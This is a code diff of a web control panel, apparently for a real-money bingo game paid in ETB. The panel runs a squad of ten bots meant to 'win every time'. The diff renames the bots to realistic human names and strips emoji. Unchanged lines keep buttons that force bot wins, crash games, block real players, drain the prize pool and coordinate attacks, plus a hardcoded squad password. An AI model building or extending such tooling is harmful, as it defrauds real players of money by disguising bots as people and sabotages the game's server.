@@ -404,34 +404,34 @@
             align-items: center;
         }
         
-        .bot-avatar.alpha { 
+        .bot-avatar.yoni-tad { 
             background: linear-gradient(135deg, #f97316, #ea580c);
         }
-        .bot-avatar.blaze { 
+        .bot-avatar.nati { 
             background: linear-gradient(135deg, #8b5cf6, #7c3aed);
         }
-        .bot-avatar.cipher { 
+        .bot-avatar.biruk { 
             background: linear-gradient(135deg, #10b981, #059669);
         }
-        .bot-avatar.delta { 
+        .bot-avatar.israel { 
             background: linear-gradient(135deg, #0ea5e9, #0284c7);
         }
-        .bot-avatar.echo { 
+        .bot-avatar.sebri { 
             background: linear-gradient(135deg, #ec4899, #db2777);
         }
-        .bot-avatar.falcon { 
+        .bot-avatar.gebre { 
             background: linear-gradient(135deg, #f59e0b, #d97706);
         }
-        .bot-avatar.ghost { 
+        .bot-avatar.fitsum { 
             background: linear-gradient(135deg, #6366f1, #4f46e5);
         }
-        .bot-avatar.hawk { 
+        .bot-avatar.fx-snipe { 
             background: linear-gradient(135deg, #14b8a6, #0d9488);
         }
-        .bot-avatar.iron { 
+        .bot-avatar.john-raga { 
             background: linear-gradient(135deg, #84cc16, #65a30d);
         }
-        .bot-avatar.jet { 
+        .bot-avatar.fthanegest { 
             background: linear-gradient(135deg, #f43f5e, #e11d48);
         }
         
@@ -591,9 +591,9 @@
 <body>
     <div class="container">
         <header>
-            <h1>🤖 BINGO ELITE - BOT SQUAD</h1>
+            <h1>BINGO ELITE - BOT SQUAD</h1>
             <p class="subtitle">Control 10 AI players that dominate the game and win every time</p>
-            <div class="status-indicator" id="globalStatus">🚫 DISCONNECTED</div>
+            <div class="status-indicator" id="globalStatus">DISCONNECTED</div>
         </header>
 
         <div class="connection-info">
@@ -608,7 +608,7 @@
 
         <div class="main-controls">
             <button id="toggleBtn" class="control-btn">
-                <span>🚫 BOT SQUAD DISABLED</span>
+                <span>BOT SQUAD DISABLED</span>
             </button>
         </div>
 
@@ -632,7 +632,7 @@
         </div>
 
         <div class="config-section">
-            <h2>⚙️ Squad Configuration</h2>
+            <h2>Squad Configuration</h2>
             <div class="config-grid">
                 <div class="config-item">
                     <label for="serverUrl">Server URL</label>
@@ -699,7 +699,7 @@
         </div>
 
         <div class="log-section">
-            <h2>📋 Squad Activity Log</h2>
+            <h2>Squad Activity Log</h2>
             <div class="log-container" id="logContainer">
                 <div class="log-entry">
                     <span class="log-time">[00:00:00]</span>
@@ -709,15 +709,15 @@
         </div>
 
         <div class="danger-zone">
-            <h2>⚠️ Special Commands</h2>
+            <h2>Special Commands</h2>
             <p class="instruction">Use these commands to completely control the game and ensure domination.</p>
             <div class="danger-btns">
-                <button class="danger-btn" onclick="forceAllBotsWin()">🎯 Force All Bots to Win Now</button>
-                <button class="danger-btn" onclick="crashGame()">💥 Crash Current Game</button>
-                <button class="danger-btn" onclick="blockRealPlayers()">🚫 Block Real Players</button>
-                <button class="danger-btn" onclick="drainRoom()">💰 Drain Prize Pool</button>
-                <button class="danger-btn" onclick="coordinateAttack()">🎯 Coordinate Team Attack</button>
-                <button class="danger-btn" onclick="resetAllBots()">🔄 Reset All Bots</button>
+                <button class="danger-btn" onclick="forceAllBotsWin()">Force All Bots to Win Now</button>
+                <button class="danger-btn" onclick="crashGame()">Crash Current Game</button>
+                <button class="danger-btn" onclick="blockRealPlayers()">Block Real Players</button>
+                <button class="danger-btn" onclick="drainRoom()">Drain Prize Pool</button>
+                <button class="danger-btn" onclick="coordinateAttack()">Coordinate Team Attack</button>
+                <button class="danger-btn" onclick="resetAllBots()">Reset All Bots</button>
             </div>
         </div>
     </div>
@@ -738,23 +738,23 @@
             botSquadPassword: "bot1234" // Bot squad password
         };
 
-        // English Bot Names with detailed profiles
+        // Bot Names with detailed profiles
         const botNames = [
-            'Alpha 👑', 
-            'Blaze ⚡', 
-            'Cipher 🎯', 
-            'Delta 🎰', 
-            'Echo 🔫',
-            'Falcon 🎭', 
-            'Ghost 🧠', 
-            'Hawk 🕺', 
-            'Iron 💪', 
-            'Jet 💥'
+            'Yoni Tad', 
+            'Nati', 
+            'Biruk', 
+            'Israel', 
+            'Sebri',
+            'Gebre', 
+            'Fitsum', 
+            'FX Snipe', 
+            'John Raga', 
+            'Fthanegest'
         ];
         
         const botAvatars = [
-            'alpha', 'blaze', 'cipher', 'delta', 'echo',
-            'falcon', 'ghost', 'hawk', 'iron', 'jet'
+            'yoni-tad', 'nati', 'biruk', 'israel', 'sebri',
+            'gebre', 'fitsum', 'fx-snipe', 'john-raga', 'fthanegest'
         ];
         
         const botPersonalities = [
@@ -864,9 +864,9 @@
                                 <div class="bot-status status-offline">OFFLINE</div>
                             </div>
                             <div>
-                                <span class="bot-skill">🎯 ${bot.winRate}% Win Rate</span>
-                                <span class="bot-skill">💰 ${bot.balance} ETB</span>
-                                <span class="bot-skill">🏆 ${bot.wins} Wins</span>
+                                <span class="bot-skill">${bot.winRate}% Win Rate</span>
+                                <span class="bot-skill">${bot.balance} ETB</span>
+                                <span class="bot-skill">${bot.wins} Wins</span>
                             </div>
                         </div>
                     </div>
@@ -877,9 +877,9 @@
                         Status: <span id="bot-status-${i}">Waiting...</span>
                     </div>
                     <div class="bot-controls">
-                        <button class="mini-btn" onclick="forceBotWin(${i})">🎯 Force Win</button>
-                        <button class="mini-btn" onclick="toggleBot(${i})">🔌 Connect</button>
-                        <button class="mini-btn" onclick="changeBotRoom(${i})">🔄 Change Room</button>
+                        <button class="mini-btn" onclick="forceBotWin(${i})">Force Win</button>
+                        <button class="mini-btn" onclick="toggleBot(${i})">Connect</button>
+                        <button class="mini-btn" onclick="changeBotRoom(${i})">Change Room</button>
                     </div>
                 `;
 
@@ -906,7 +906,7 @@
                         }
                     })
                     .then(data => {
-                        log(`✅ Server is reachable (${data.status})`, 'success');
+                        log(`Server is reachable (${data.status})`, 'success');
                         
                         // Now test socket.io connection
                         if (config.masterSocket && config.masterSocket.connected) {
@@ -920,10 +920,10 @@
                         });
                         
                         config.masterSocket.on('connect', () => {
-                            log(`✅ Successfully connected to server via Socket.IO`, 'success');
+                            log(`Successfully connected to server via Socket.IO`, 'success');
                             connectionDot.className = 'connection-dot connected';
                             connectionStatus.textContent = `Connected to ${serverUrl}`;
-                            globalStatus.textContent = '✅ CONNECTED';
+                            globalStatus.textContent = 'CONNECTED';
                             globalStatus.className = 'status-indicator active';
                             serverUrlDisplay.textContent = serverUrl;
                             config.connectionTested = true;
@@ -932,7 +932,7 @@
                             // Test a quick ping
                             config.masterSocket.emit('ping');
                             config.masterSocket.on('pong', () => {
-                                log(`✅ Server ping successful`, 'success');
+                                log(`Server ping successful`, 'success');
                             });
                             
                             // Disconnect test socket
@@ -942,10 +942,10 @@
                         });
                         
                         config.masterSocket.on('connect_error', (error) => {
-                            log(`❌ Socket.IO connection failed: ${error.message}`, 'error');
+                            log(`Socket.IO connection failed: ${error.message}`, 'error');
                             connectionDot.className = 'connection-dot';
                             connectionStatus.textContent = `Socket.IO failed: ${error.message}`;
-                            globalStatus.textContent = '❌ SOCKET FAILED';
+                            globalStatus.textContent = 'SOCKET FAILED';
                             globalStatus.className = 'status-indicator';
                             config.connectionTested = false;
                             resolve(false);
@@ -956,10 +956,10 @@
                         });
                     })
                     .catch(error => {
-                        log(`❌ Cannot reach server: ${error.message}`, 'error');
+                        log(`Cannot reach server: ${error.message}`, 'error');
                         connectionDot.className = 'connection-dot';
                         connectionStatus.textContent = `Failed to connect: ${error.message}`;
-                        globalStatus.textContent = '❌ CONNECTION FAILED';
+                        globalStatus.textContent = 'CONNECTION FAILED';
                         globalStatus.className = 'status-indicator';
                         config.connectionTested = false;
                         resolve(false);
@@ -1125,7 +1125,7 @@
                             stats.totalEarnings += prize;
                             stats.gamesPlayed++;
                             
-                            log(`🎉 Bot ${bot.name} WON ${prize} ETB!`, 'success');
+                            log(`Bot ${bot.name} WON ${prize} ETB!`, 'success');
                             updateBotCard(index);
                             updateStats();
                             updateQuickStats();
@@ -1416,7 +1416,7 @@
             config.isActive = !config.isActive;
             
             if (config.isActive) {
-                toggleBtn.innerHTML = '<span>✅ BOT SQUAD ACTIVE</span>';
+                toggleBtn.innerHTML = '<span>BOT SQUAD ACTIVE</span>';
                 toggleBtn.classList.add('btn-on');
                 log('Activating all bots...', 'warning');
                 
@@ -1449,7 +1449,7 @@
                 log(`All bots activating with ${config.staggerDelay}ms stagger...`, 'success');
                 
             } else {
-                toggleBtn.innerHTML = '<span>🚫 BOT SQUAD INACTIVE</span>';
+                toggleBtn.innerHTML = '<span>BOT SQUAD INACTIVE</span>';
                 toggleBtn.classList.remove('btn-on');
                 log('Deactivating all bots...', 'warning');
                 
@@ -1518,7 +1518,7 @@
             // Update control button text
             const toggleBtn = botCard.querySelector('.mini-btn:nth-child(2)');
             if (toggleBtn) {
-                toggleBtn.textContent = status === 'offline' ? '🔌 Connect' : '🔌 Disconnect';
+                toggleBtn.textContent = status === 'offline' ? 'Connect' : 'Disconnect';
             }
         }
 
@@ -1542,9 +1542,9 @@
                 const skillsDiv = botCard.querySelector('.bot-info div:nth-child(2)');
                 if (skillsDiv) {
                     skillsDiv.innerHTML = `
-                        <span class="bot-skill">🎯 ${bot.winRate}% Win Rate</span>
-                        <span class="bot-skill">💰 ${bot.balance} ETB</span>
-                        <span class="bot-skill">🏆 ${bot.wins} Wins</span>
+                        <span class="bot-skill">${bot.winRate}% Win Rate</span>
+                        <span class="bot-skill">${bot.balance} ETB</span>
+                        <span class="bot-skill">${bot.wins} Wins</span>
                     `;
                 }
             }
@@ -1732,7 +1732,7 @@
             bots.forEach(bot => bot.willWin = false);
             
             // Select 3 bots to win in sequence
-            const attackers = [0, 3, 6]; // Alpha, Delta, Ghost
+            const attackers = [0, 3, 6]; // Yoni Tad, Israel, Fitsum
             attackers.forEach((botIndex, i) => {
                 setTimeout(() => {
                     const bot = bots[botIndex];
@@ -1786,7 +1786,7 @@
             setTimeout(() => {
                 testServerConnection().then(connected => {
                     if (connected) {
-                        log('✅ Server connection successful', 'success');
+                        log('Server connection successful', 'success');
                         // Auto-start if URL parameter present
                         const urlParams = new URLSearchParams(window.location.search);
                         if (urlParams.get('autoStart') === 'true') {
@@ -1795,7 +1795,7 @@
                             }, 2000);
                         }
                     } else {
-                        log('❌ Server connection failed. Check server URL.', 'error');
+                        log('Server connection failed. Check server URL.', 'error');
                     }
                 });
             }, 1000);
